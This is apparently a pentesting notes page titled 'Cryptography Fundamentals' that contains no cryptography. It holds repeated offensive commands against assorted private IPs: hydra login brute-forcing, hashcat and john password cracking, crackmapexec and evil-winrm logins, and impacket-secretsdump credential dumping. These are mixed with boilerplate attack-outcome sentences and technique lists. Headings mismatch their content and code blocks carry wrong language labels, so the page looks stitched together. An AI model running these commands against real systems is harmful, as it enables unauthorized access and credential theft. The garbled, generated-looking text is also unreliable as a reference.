---
TitleSEO: "Cryptography Fundamentals | ZureFX"
TitlePost: "Cryptography Fundamentals"
Author: "ZureFX"
Description: "Personal notes on Cryptography Fundamentals. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, linux, networking, lateral movement, privilege escalation"
URL: "https://zurefx.github.io/notes/note-cryptography-fundamentals-746.html"
URL_IMAGES: ""
Date: "2024-07-03"
Tags: "Cheatsheet, Linux, Networking, Lateral Movement, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-cryptography-fundamentals-746"
Permalink: "/notes/note-cryptography-fundamentals-746.html"
BtnLabel: "Read Notes"
Pick: 0
---
## pwncat

### hashcat

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.73.90.223/FUZZ
nmap -sCV -p27017,1521,8080 10.123.223.72 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.49.20 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.26.253.70 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files.

```python
nmap -sCV -p3268,80,139 10.22.101.167 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.110.119.206 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.114.200.33 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
crackmapexec smb 10.64.241.142 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.75.219.97 -u administrator -p 'P@ssw0rd!'
```

## MSSQL

### Cron Job

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

```python
feroxbuster -h
```

```bash
evil-winrm -i 10.61.68.179 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

- `Remote Code Execution`
- `AS-REP Roasting`
- `XSS`

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.98.52.173 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.25.215
```

## SeImpersonatePrivilege

### gobuster

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.87.152.8/FUZZ
evil-winrm -i 10.18.159.165 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.14.35.156 -u administrator -p 'P@ssw0rd!' --shares
```

Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

- `crackmapexec`
- `Docker Escape`
- `GetUserSPNs`

- `Kerberoasting`
- `atexec`
- `impacket`
- `GetNPUsers`
- `metasploit`

The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

## Python

### enum4linux

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

- `Insecure Deserialization`
- `Path Traversal`
- `GetNPUsers`
- `chisel`
- `gobuster`
- `Golden Ticket`

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.
